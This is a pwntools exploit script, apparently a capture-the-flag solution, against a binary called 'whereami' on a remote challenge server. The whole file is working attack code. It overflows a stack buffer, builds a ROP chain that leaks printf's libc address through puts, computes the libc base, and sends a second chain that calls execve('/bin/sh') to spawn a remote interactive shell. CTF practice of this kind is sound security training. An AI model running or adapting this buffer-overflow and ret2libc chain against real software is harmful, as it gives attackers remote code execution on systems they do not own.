from pwn import *
from pwnlib.util.packing import p64, u64, unpack

context.arch='amd64'
elf = ELF('whereami', checksec=False)
libc = ELF('libc.so.6', checksec=False)

rop = ROP(elf)

poprdi = 0x00401303
pop_rsi_r15 = 0x00401301
ret = 0x0040101a

sm = libc.symbols[b'system']

rop.raw('a'*0x40)
rop.raw(unpack(b'AAAAAAAA'))
rop.raw(p64(poprdi))
rop.raw(p64(elf.got.printf))
rop.raw(p64(elf.symbols.puts))

rop.raw(p64(poprdi))
rop.raw(p64(elf.symbols.counter))
rop.raw(p64(elf.symbols.gets))

rop.raw(p64(ret))
rop.raw(p64(elf.symbols.main))

payload = bytes(rop)

p = remote('challs.actf.co', 31222)
#p = process(elf)

print(p.recvuntil(b'?').decode())
p.sendline(payload)
p.sendline(b'\x00')
print(p.recvuntil(b'too.\n').decode())
data = p.recvn(6).ljust(8, b'\x00')

printfAddr = u64(data)

log.success("Leaked printf address: 0x%x", printfAddr)
baseAddr = printfAddr - libc.symbols.printf
libc.address = baseAddr

pop_rdx_r12 = baseAddr + 0x0000000000119241

rop2 = ROP([elf, libc])
sh = next(libc.search(b"/bin/sh\x00"))
rop2.raw(0x40*'a')
rop2.raw(unpack(b'AAAABBBB'))

# the hard way
rop2.raw(p64(pop_rdx_r12))
rop2.raw(p64(0x00))
rop2.raw(p64(0x00))
rop2.raw(p64(pop_rsi_r15))
rop2.raw(p64(0x00))
rop2.raw(p64(0x00))
rop2.raw(p64(poprdi))
rop2.raw(p64(sh))
rop2.raw(p64(libc.symbols.execve))

# shorter way:
# rop2.execve(sh, 0, 0)

#print(bytes(rop2))
#print("")
#print(hex(libc.symbols.execve - baseAddr))

print(p.recvuntil(b"?").decode())
p.sendline(bytes(rop2))

p.interactive()
